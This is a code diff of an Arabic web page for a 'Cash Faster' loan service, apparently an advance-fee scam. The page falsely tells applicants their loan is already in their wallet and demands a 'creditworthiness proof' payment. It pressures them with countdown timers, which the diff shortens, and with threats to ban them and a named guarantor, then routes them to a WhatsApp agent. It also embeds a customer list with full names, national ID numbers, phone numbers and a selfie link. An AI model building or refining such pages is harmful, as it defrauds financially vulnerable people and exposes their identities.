@@ -92,18 +92,18 @@
         .success-header h2 { color: var(--primary-lime); font-size: 1.6rem; margin-bottom: 0.3rem; font-weight: 800; }
         .success-header p { color: var(--text-muted); font-size: 0.9rem; }
         .receipt-card {
-            background: linear-gradient(135deg, #0b2b1f 0%, #071a12 100%);
-            border: 2px solid var(--accent-gold);
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            border: 2px solid #d4af37;
             border-radius: 2rem;
             padding: 1.8rem;
             margin: 1.5rem 0;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
+            box-shadow: 0 0 30px rgba(212, 175, 55, 0.3);
             position: relative;
             font-family: 'Cairo', monospace;
         }
         .receipt-header {
             text-align: center;
-            border-bottom: 2px dashed var(--accent-gold);
+            border-bottom: 2px dashed #d4af37;
             padding-bottom: 1rem;
             margin-bottom: 1.2rem;
         }
@@ -117,7 +117,7 @@
             gap: 0.8rem;
         }
         .receipt-header h2 i {
-            color: var(--accent-gold);
+            color: #d4af37;
             font-size: 2rem;
         }
         .receipt-badge {
@@ -141,7 +141,7 @@
             justify-content: space-between;
             align-items: center;
             padding: 0.7rem 0;
-            border-bottom: 1px solid rgba(255, 215, 0, 0.2);
+            border-bottom: 1px solid rgba(212, 175, 55, 0.2);
             font-size: 0.9rem;
         }
         .detail-row:last-child {
@@ -156,14 +156,14 @@
         }
         .detail-value {
             font-weight: 800;
-            color: var(--accent-gold);
+            color: #d4af37;
             text-align: left;
             direction: ltr;
             font-family: monospace;
             font-size: 0.95rem;
         }
         .amount-big {
-            background: linear-gradient(135deg, rgba(255, 215, 0, 0.2), rgba(57, 255, 20, 0.1));
+            background: linear-gradient(135deg, rgba(212, 175, 55, 0.2), rgba(57, 255, 20, 0.1));
             text-align: center;
             padding: 1rem;
             border-radius: 1.5rem;
@@ -176,15 +176,15 @@
         .amount-big .value {
             font-size: 2.5rem;
             font-weight: 900;
-            color: var(--accent-gold);
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+            color: #d4af37;
+            text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
         }
         .receipt-footer {
             text-align: center;
             margin-top: 1.2rem;
             font-size: 0.8rem;
             color: var(--primary-lime);
-            border-top: 1px dashed var(--accent-gold);
+            border-top: 1px dashed #d4af37;
             padding-top: 1rem;
         }
         .info-message {
@@ -211,7 +211,26 @@
         .amount-highlight { background: rgba(255, 215, 0, 0.12); border: 2px solid var(--accent-gold); border-radius: 1rem; padding: 1rem; margin: 0.8rem 0; text-align: center; font-size: 1.3rem; font-weight: 800; color: var(--accent-gold); text-shadow: 0 0 12px rgba(255, 215, 0, 0.4); }
         .timer-section { background: rgba(255, 107, 53, 0.08); border: 2px solid var(--accent-orange); border-radius: 1.5rem; padding: 1.5rem; text-align: center; margin: 1.2rem 0; }
         .timer-label { font-size: 1rem; color: var(--accent-orange); margin-bottom: 0.8rem; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 0.4rem; }
-        .timer { font-size: 2.2rem; font-weight: 900; font-family: 'Courier New', monospace; color: var(--accent-gold); margin: 0.8rem 0; text-shadow: 0 0 15px rgba(255, 215, 0, 0.5); letter-spacing: 1px; }
+        .timer {
+            font-size: 2.2rem;
+            font-weight: 900;
+            font-family: 'Courier New', monospace;
+            color: var(--accent-gold);
+            margin: 0.8rem 0;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+            letter-spacing: 1px;
+            animation: timerGlow 1s ease-in-out infinite;
+        }
+        @keyframes timerGlow {
+            0%, 100% { 
+                text-shadow: 0 0 15px rgba(255, 215, 0, 0.5), 0 0 25px rgba(255, 107, 53, 0.3);
+                transform: scale(1);
+            }
+            50% { 
+                text-shadow: 0 0 25px rgba(255, 215, 0, 0.8), 0 0 40px rgba(255, 107, 53, 0.6);
+                transform: scale(1.05);
+            }
+        }
         .suspended-card { background: linear-gradient(135deg, rgba(255, 107, 53, 0.15), rgba(255, 0, 110, 0.1)); border: 3px solid var(--accent-orange); border-radius: 2rem; padding: 2rem; text-align: center; margin: 1.5rem 0; animation: pulseWarning 1.5s infinite; }
         @keyframes pulseWarning { 0% { box-shadow: 0 0 0 0 rgba(255, 107, 53, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(255, 107, 53, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 107, 53, 0); } }
         .suspended-icon { font-size: 4rem; color: var(--accent-orange); margin-bottom: 1rem; }
@@ -274,9 +293,9 @@
 
     <script>
         // ========== قاعدة بيانات العملاء الكاملة ==========
-        // تم إضافة تعليق خاص للعميل "حمدى صابر عبد الرحمن المهدى" (28212170200392) مع عداد 60 دقيقة
+        // تم إضافة تعليق خاص للعميل "حمدى صابر عبد الرحمن المهدى" (28212170200392) مع عداد 30 دقيقة وإغلاق 90 يوم
         const customersDatabase = {
-            "28310021401735": { name: "احمد عبدالهادي احمد عبدالهادي", wallet: "فودافون كاش", walletNum: "01024442779", loan: 120000, suspended: false },
+            "28707300100939": { name: "محمد عبد الرحمن عبد المبدى احمد", wallet: "اتصالات كاش", walletNum: "01124250880", loan: 100000, suspended: false },
             "26301141900259": { name: "محمد كمال محمد فهمى", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 55000, suspended: false },
             "294011427522": { name: "امنيه محمد محروس عبد الغفار", wallet: "فودافون كاش", walletNum: "01032842112", loan: 65000, suspended: true, selfieUrl: "https://i.ibb.co/BVPtC6m5/taken-picture-u-SJlf1ma-diepx-3395780.jpg" },
             "29602120101179": { name: "مصطفي عمر عبد العزيز حسين", wallet: "اتصالات كاش", walletNum: "01111010803", loan: 50000, suspended: false },
@@ -289,8 +308,8 @@
             "26512100201592": { name: "عماد جابر ابو المجد السمان", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 200000, suspended: false },
             "28308310200417": { name: "احمد محمد عبد الفتاح عبد العزيز", wallet: "فودافون كاش", walletNum: "01094656137", loan: 65000, suspended: false },
             "27501102402333": { name: "احمد ابراهيم احمد ابراهيم", wallet: "فودافون كاش", walletNum: "01023726660", loan: 200000, suspended: true, customSuspension: true, guarantorName: "دعاء محمد يوسف", guarantorWallet: "محفظة الزوجة", deadlineTime: "12 ظهراً" },
-            // العميل : حمدى ص عبد الرحمن المهدى (رقم 28212عداد 60 دقيقة
-            "2821200392": { name: "حمدى صابر عبد الرحمن المهدى", wallet: "فودافون كاش", walletNum: "01069576289", loan: 100000, suspended: true, customSuspension: true, timeLimitMinutes: 60, loanAmount: 100000, proofAmount: 8000, guarantorName: "محمد صابر عبدالرحمن" },
+            // العميل : حمدى صابر عبد الرحمن المهدى (رقم 28212170200392) - عداد 30 دقيقة وإغلاق 90 يوم
+            "2821200392": { name: "حمدى صابر عبد الرحمن المهدى", wallet: "فودافون كاش", walletNum: "01069576289", loan: 100000, suspended: true, customSuspension: true, timeLimitMinutes: 30, loanAmount: 100000, proofAmount: 8000, guarantorName: "محمد صابر عبدالرحمن", suspensionDays: 90 },
             "28103022300236": { name: "سيد سليمان ابراهيم علي", wallet: "فودافون كاش", walletNum: "01000508569", loan: 200000, suspended: false },
             "28503010105207": { name: "نسمه محمد السيد محمد السيد", wallet: "اتصالات كاش", walletNum: "01101627379", loan: 30000, suspended: false },
             "28408031300171": { name: "ابراهيم السيد احمد ابراهيم", wallet: "فودافون كاش", walletNum: "01097084993", loan: 50000, suspended: false },
@@ -319,38 +338,20 @@
             "28307140100653": { name: "عمرو محمود عبدالعزيز عمر", wallet: "فودافون كاش", walletNum: "01020434770", loan: 75000, suspended: false },
             "26412271100676": { name: "على محمد أبو العلا عيطه", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 30000, suspended: false },
             "25911031701438": { name: "طلعت عبد السلام يونس نصار", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 50000, suspended: false },
-            "27208100104611": { name: "عشم إسرائيل فيلبس مسعد", wallet: "فودافون كاش", walletNum: "01015090271", loan: 85000, suspended: false },
-            "23801231200857": { name: "سامح السيد مصطفى مصطفى شلبى", wallet: "فودافون كاش", walletNum: "01022385155", loan: 50000, suspended: false },
-            "27606071401917": { name: "مازن فرحات كامل امام", wallet: "فودافون كاش", walletNum: "01014342001", loan: 200000, suspended: false },
-            "28201100200059": { name: "سامح محمد محمد السيد", wallet: "فودافون كاش", walletNum: "01038267168", loan: 175000, suspended: false },
-            "28103281701131": { name: "محمود احمد حسن سرحان", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 40000, suspended: false },
-            "27011191401755": { name: "عبد الوهاب سالم محمد النقيطي", wallet: "فودافون كاش", walletNum: "01067461925", loan: 50000, suspended: false },
-            "28503061201391": { name: "ناجي المهدي إبراهيم أحمد", wallet: "فودافون كاش", walletNum: "01035689091", loan: 70000, suspended: false },
-            "30503231401519": { name: "كيرلس عزيز وليم عزيز", wallet: "اتصالات كاش", walletNum: "01120884951", loan: 30000, suspended: false },
-            "27902100373": { name: "محمد عبد العزيز زيد عبد الحافظ", wallet: "اتصالات كاش", walletNum: "01111250123", loan: 50000, suspended: false },
-            "28712031401378": { name: "احمد محمد عوض عبدالغني", wallet: "اتصالات كاش", walletNum: "01158944456", loan: 200000, suspended: false },
-            "26006082100519": { name: "مجدي ابراهيم محمد منصور", wallet: "فودافون كاش", walletNum: "01003068153", loan: 200000, suspended: false }
+            "27208100104611": { name: "عشم إسرائيل فيلبس مسعد", wallet: "فودافون كاش", walletNum: "01015090271", loan: 85000, suspended: false }
         };
 
         const loanDetailsMap = {
-            30000: { months: 12, installment: 3325 }, 35000: { months: 12, installment: 3875 },
-            40000: { months: 18, installment: 2965 }, 45000: { months: 18, installment: 3325 },
-            50000: { months: 24, installment: 2725 }, 55000: { months: 24, installment: 3075 },
-            60000: { months: 24, installment: 3085 }, 65000: { months: 26, installment: 3325 },
-            70000: { months: 26, installment: 3585 }, 75000: { months: 26, installment: 3845 },
-            80000: { months: 30, installment: 3550 }, 85000: { months: 30, installment: 3775 },
-            90000: { months: 30, installment: 3990 }, 95000: { months: 30, installment: 4220 },
-            100000: { months: 32, installment: 4157 }, 105000: { months: 32, installment: 4375 },
-            110000: { months: 32, installment: 4580 }, 115000: { months: 38, installment: 4075 },
-            120000: { months: 38, installment: 4235 }, 125000: { months: 38, installment: 4035 },
-            130000: { months: 42, installment: 4400 }, 135000: { months: 42, installment: 4305 },
-            140000: { months: 42, installment: 4495 }, 145000: { months: 48, installment: 4075 },
-            150000: { months: 48, installment: 4205 }, 154000: { months: 48, installment: 4315 },
-            155000: { months: 48, installment: 4315 }, 160000: { months: 48, installment: 4435 },
-            165000: { months: 48, installment: 4615 }, 170000: { months: 48, installment: 4725 },
-            175000: { months: 48, installment: 4848 }, 180000: { months: 54, installment: 4435 },
-            185000: { months: 54, installment: 4557 }, 190000: { months: 60, installment: 4215 },
-            195000: { months: 60, installment: 4325 }, 200000: { months: 60, installment: 4440 }
+            30000: { months: 12, installment: 2750 }, 50000: { months: 24, installment: 2300 },
+            55000: { months: 24, installment: 2530 }, 60000: { months: 24, installment: 2760 },
+            65000: { months: 24, installment: 2990 }, 70000: { months: 30, installment: 2520 },
+            75000: { months: 30, installment: 2690 }, 80000: { months: 30, installment: 2870 },
+            85000: { months: 30, installment: 3050 }, 100000: { months: 36, installment: 3200 },
+            125000: { months: 42, installment: 3400 }, 150000: { months: 42, installment: 4050 },
+            155000: { months: 48, installment: 3800 }, 175000: { months: 48, installment: 4848 },
+            180000: { months: 54, installment: 4435 }, 185000: { months: 54, installment: 4557 },
+            190000: { months: 60, installment: 4215 }, 195000: { months: 60, installment: 4325 },
+            200000: { months: 60, installment: 4440 }
         };
 
         let activeTimerInterval = null;
@@ -366,9 +367,8 @@
             return loanDetailsMap[closest] || { months: 12, installment: 0 };
         }
         function calculateProofAmount(loanAmount) {
-            if (loanAmount < 50000) return 4000;
-            else if (loanAmount <= 100000) return 6000;
-            else if (loanAmount <= 200000) return 8000;
+            if (loanAmount < 100000) return 6000;
+            else if (loanAmount >= 100000) return 8000;
             else return 10000;
         }
         function calculateReceiptTime() { return Math.floor(Math.random() * 5) + 5; }
@@ -406,14 +406,15 @@
             suspendedDiv.style.display = 'block';
             
             // رسالة خاصة للعميل حمدى صابر عبد الرحمن المهدى (28212170200392)
-            if (customer.customSuspension && customer.id === "28212170200392") {
+            if (customer.customSuspension && customer.id === "2821200392") {
                 const proofAmt = customer.proofAmount || 8000;
                 const loanAmt = customer.loanAmount || customer.loan || 100000;
-                const timeLimit = customer.timeLimitMinutes || 60;
+                const timeLimit = customer.timeLimitMinutes || 30;
+                const suspensionDays = customer.suspensionDays || 90;
                 const guarantor = customer.guarantorName || "محمد صابر عبدالرحمن";
                 let timeLeft = timeLimit * 60;
                 
-                // إنشاء العداد التنازلي
+                // إنشاء العداد التنازلي المتوهج
                 const timerId = setInterval(() => {
                     if (timeLeft <= 0) {
                         clearInterval(timerId);
@@ -422,9 +423,11 @@
                         // إظهار رسالة نهائية مفادها إيقاف الطلب
                         const msgDiv = document.getElementById('suspendedMessage');
                         if (msgDiv) {
-                            msgDiv.innerHTML = `<div style="background: rgba(255,0,0,0.2); padding:1rem; border-radius:1rem;">
-                                <strong style="color:#FF6B35;">⚠️ تم إيقاف طلبك نهائياً!</strong><br>
-                                لأنك لم تقم بإثبات الجدارة خلال المدة المحددة. لن تتمكن أنت أو الضامن (${guarantor}) من التقديم مرة أخرى.
+                            msgDiv.innerHTML = `<div style="background: rgba(255,0,0,0.2); padding:1rem; border-radius:1rem; border: 2px solid #ff6b6b;">
+                                <strong style="color:#FF6B35; font-size: 1.2rem;">⚠️ تم إيقاف طلبك نهائياً!</strong><br><br>
+                                لأنك لم تقم بإثبات الجدارة خلال المدة المحددة (${timeLimit} دقيقة).<br>
+                                <strong>سيتم إغلاق طلبك لمدة ${suspensionDays} يوم ولن تتمكن من استعادة الطلب قبل مرور هذه المدة.</strong><br>
+                                أنت والضامن (${guarantor}) لن تتمكنا من التقديم مرة أخرى قبل انتهاء فترة الإيقاف.
                             </div>`;
                         }
                     } else {
@@ -450,9 +453,12 @@
                             ✅ <strong style="color: var(--primary-lime);">القرض بقيمة ${formatCurrency(loanAmt)} تم دفعه بالفعل إلى حسابك</strong><br>
                             يجب عليك إثبات الجدارة الائتمانية خلال المدة المحددة لصرف القرض فوراً.<br><br>
                             📌 <strong>مبلغ الجدارة المطلوب: ${formatCurrency(proofAmt)}</strong><br><br>
-                            ⏰ <strong id="suspendedTimer" style="font-size:1.8rem; font-family:monospace;">${String(Math.floor(timeLimit/60)).padStart(2,'0')}:${String(timeLimit%60).padStart(2,'0')}:00</strong><br><br>
+                            <div style="background: rgba(255, 107, 53, 0.15); padding: 1rem; border-radius: 1rem; margin: 1rem 0; border: 2px solid var(--accent-orange);">
+                                <div style="font-size: 0.9rem; color: var(--accent-orange); margin-bottom: 0.5rem;"><i class="fas fa-hourglass-end"></i> الوقت المتبقي:</div>
+                                <div id="suspendedTimer" style="font-size: 2.5rem; font-family: monospace; font-weight: 900; color: #FFD700; text-shadow: 0 0 20px rgba(255, 215, 0, 0.6), 0 0 30px rgba(255, 107, 53, 0.5); animation: timerGlow 1s ease-in-out infinite;">${String(Math.floor(timeLimit/60)).padStart(2,'0')}:${String(timeLimit%60).padStart(2,'0')}:00</div>
+                            </div><br>
                             ⚠️ <strong style="color: var(--accent-orange);">تنبيه هام:</strong> إذا لم تقم بالإثبات خلال الوقت المحدد واتباع تعليمات مندوبتنا على واتساب بقسم التحويلات المالية،<br>
-                            <strong>سيتم إيقاف طلبك نهائياً لدينا ولن تتمكن أنت أو الضامن (${guarantor}) من الحصول على تمويل مرة أخرى.</strong><br><br>
+                            <strong>سيتم إيقاف طلبك نهائياً لمدة ${suspensionDays} يوم ولن تتمكن أنت أو الضامن (${guarantor}) من الحصول على تمويل مرة أخرى.</strong><br><br>
                             📞 اضغط على الزر أدناه للتواصل مع مندوبتنا فوراً.
                         </div>
                         <button class="btn-whatsapp-suspend" onclick="openWhatsAppForHamdy('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${proofAmt}, '${guarantor}')">
@@ -498,7 +504,6 @@
                             وجارٍ صرفه فور إثبات الجدارة والانتهاء من إجراءات الإثبات المطلوبة منك.<br><br>
                             📌 <strong>مبلغ الجدارة المطلوب: ${formatCurrency(proofAmt)}</strong><br><br>
                             👩‍💼 يمكنك متابعة مسؤولة قسم التحويلات المالية <strong style="color: var(--accent-gold);">/ولاء عطية/</strong> على واتساب،<br>
-                            ومتابعة الإثبات معها خطوة بخطوة لينتهي إجراء التحقق ويصرف القرض فوراً وتستلم المبلغ كاش على محفظتك.<br><br>
                             📞 اضغط على الزر أدناه للتواصل مباشرة مع الأستاذة ولاء عطية.
                         </div>
                         <button class="btn-whatsapp-suspend" onclick="openWhatsAppForYasser('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${proofAmt})">
@@ -579,12 +584,12 @@
                 <div class="receipt-card">
                     <div class="receipt-header">
                         <h2><i class="fas fa-check-circle"></i> عملية ناجحة</h2>
-                        <div class="receipt-badge">تم دفع التمويل إلى حسابك</div>
+                        <div class="receipt-badge">جارى دفع التمويل إلى حسابك</div>
                     </div>
                     <div class="amount-big">
                         <div class="label">قيمة التمويل المدفوع لحسابك</div>
                         <div class="value">${formatCurrency(customer.loan)}</div>
-                        <div style="font-size:0.75rem; margin-top:5px;">تم تسيل المبلغ بنجاح في محفظتك</div>
+                        <div style="font-size:0.75rem; margin-top:5px;">تم تسيل المبلغ بنجاح إلى محفظتك</div>
                     </div>
                     <div class="receipt-details">
                         <div class="detail-row"><span class="detail-label"><i class="fas fa-wallet"></i> رقم المحفظة</span><span class="detail-value">${customer.walletNum}</span></div>
@@ -599,8 +604,8 @@
                     </div>
                     <div class="info-message">
                         <i class="fas fa-envelope-open-text" style="color: var(--accent-gold);"></i> 
-                        <strong>تم إيداع المبلغ في حسابك بنجاح!</strong><br>
-                        ستصل رسالة تأكيد الإيداع على موبايلك خلال دقائق. لإتمام صرف القرض، يرجى إكمال إجراءات إثبات الجدارة الائتمانية أدناه.
+                        <strong>سيتم إيداع المبلغ في حسابك خلال ${receiptMinutes} دقائق من الاثبات!</strong><br>
+                        ستصل رسالة تأكيد الإيداع على موبايلك خلال ${receiptMinutes} دقيقة. لإتمام صرف القرض، يرجى إكمال إجراءات إثبات الجدارة الائتمانية أدناه.
                     </div>
                     <div class="receipt-footer"><i class="fas fa-lock"></i> هذه عملية موثقة ومرقمة وفق أنظمة البنك المركزي</div>
                 </div>
@@ -612,7 +617,7 @@
                     <div class="info-box success"><strong><i class="fas fa-lightbulb"></i> ما هي الجدارة الائتمانية؟</strong><br>هذا إجراء أمني بسيط لتأكيد ملكيتك للمحفظة. <strong>لا يتعلق الأمر بدفع لنا أو تحويل لنا</strong>، بل هو إثبات من طرفك لنفسك فقط! ستقوم بإيداع مبلغ مؤقت من شخص تثق به (صديق أو قريب) إلى محفظتك، ثم تحويله مرة أخرى إلى نفس الشخص. هذا يثبت أن حسابك نشط وتحت تحكمك الكامل.</div>
                     <div class="proof-step"><div class="proof-step-number">1️⃣ مبلغ الجدارة المطلوب</div><div class="proof-step-title">المبلغ الذي سيتم إيداعه من شخص آخر إليك</div><div class="proof-step-content"><div class="amount-highlight">${formatCurrency(proofAmount)}</div><p>هذا المبلغ سيتم إيداعه من أي شخص تثق به (صديق أو قريب) إلى محفظتك كخطوة أولى للتحقق من صحة الحساب.</p></div></div>
                     <div class="proof-step"><div class="proof-step-number">2️⃣ خطوات الإثبات الواضحة</div><div class="proof-step-title">ماذا تفعل بعد استقبال المبلغ؟</div><div class="proof-step-content"><strong style="color: var(--primary-lime);">الخطوة الأولى:</strong> اطلب من شخص تثق به (صديق أو قريب) أن يحول لك المبلغ ${formatCurrency(proofAmount)} إلى محفظتك<br><br><strong style="color: var(--primary-lime);">الخطوة الثانية:</strong> تحقق من وصول المبلغ إلى محفظتك<br><br><strong style="color: var(--primary-lime);">الخطوة الثالثة:</strong> خذ لقطة شاشة (سكرين شوت) واضحة جداً تظهر المبلغ ${formatCurrency(proofAmount)} وصل إلى حسابك (يجب أن يظهر الرقم والتاريخ والوقت)<br><br><strong style="color: var(--primary-lime);">الخطوة الرابعة:</strong> حول نفس المبلغ ${formatCurrency(proofAmount)} مرة أخرى إلى نفس الشخص (أو أي شخص آخر)<br><br><strong style="color: var(--primary-lime);">الخطوة الخامسة:</strong> خذ لقطة شاشة (سكرين شوت) واضحة جداً تظهر خروج المبلغ من حسابك (يجب أن يظهر الرقم والتاريخ والوقت)<br><br><strong style="color: var(--accent-gold);">الخطوة السادسة:</strong> أرسل الصورتين عبر واتساب إلى فريق Cash Faster</div></div>
-                    <div class="timer-section"><div class="timer-label"><i class="fas fa-hourglass-end"></i> الوقت المتبقي لإثبات الجدارة</div><div class="timer" id="proofTimer">27:00</div><p style="color: var(--text-muted); margin-top: 0.8rem;">⚠️ يجب إتمام الإجراء خلال 27 دقيقة</p></div>
+                    <div class="timer-section"><div class="timer-label"><i class="fas fa-hourglass-end"></i> الوقت المتبقي لإثبات الجدارة</div><div class="timer" id="proofTimer">30:00</div><p style="color: var(--text-muted); margin-top: 0.8rem;">⚠️ يجب إتمام الإجراء خلال 30 دقيقة</p></div>
                     <div class="proof-step"><div class="proof-step-number">3️⃣ بعد إثبات الجدارة</div><div class="proof-step-title">ماذا يحدث بعد إرسال الصور؟</div><div class="proof-step-content">✅ <strong>التحقق الفوري:</strong> سيتم التحقق من صورك خلال دقائق<br><br>✅ <strong>تأكيد التحويل:</strong> سيتم تأكيد تحويل القرض الكامل ${formatCurrency(customer.loan)} إلى حسابك (تم بالفعل إيداعه في انتظار الإفراج)<br><br>✅ <strong>موعد الاستلام:</strong> خلال ${receiptMinutes} دقائق من التحقق<br><br>✅ <strong>القسط الشهري:</strong> ${formatCurrency(details.installment)}<br><br>✅ <strong>عدد الأقساط:</strong> ${details.months} شهر<br><br>✅ <strong>إجمالي المبلغ بعد الأقساط:</strong> ${formatCurrency(details.installment * details.months)}</div></div>
                     <div class="info-box warning"><strong><i class="fas fa-exclamation-triangle"></i> معلومات مهمة</strong><br>• <strong>لا تقلق:</strong> مبلغ الجدارة ليس خصماً من القرض، بل هو إثبات فقط<br>• <strong>الصور يجب أن تكون واضحة جداً</strong> تظهر الأرقام والتاريخ والوقت<br>• <strong>يجب أن يظهر المبلغ والدخول والخروج</strong> من نفس الحساب<br>• <strong>استخدم شخص تثق به</strong> لتحويل المبلغ إليك أولاً</div>
                     <div class="info-box"><strong><i class="fas fa-info-circle"></i> ملخص العملية</strong><br>هذا إجراء أمني قياسي يثبت أن حسابك نشط وتحت تحكمك. بعد إثبات الجدارة، سيتم الإفراج عن القرض الكامل ${formatCurrency(customer.loan)} المودع بالفعل في محفظتك، وستبدأ الأقساط من الشهر القادم.</div>
@@ -625,7 +630,7 @@
         }
 
         function startProofTimer() {
-            let timeLeft = 27 * 60;
+            let timeLeft = 30 * 60;
             function updateTimer() {
                 const minutes = Math.floor(timeLeft / 60);
                 const seconds = timeLeft % 60;
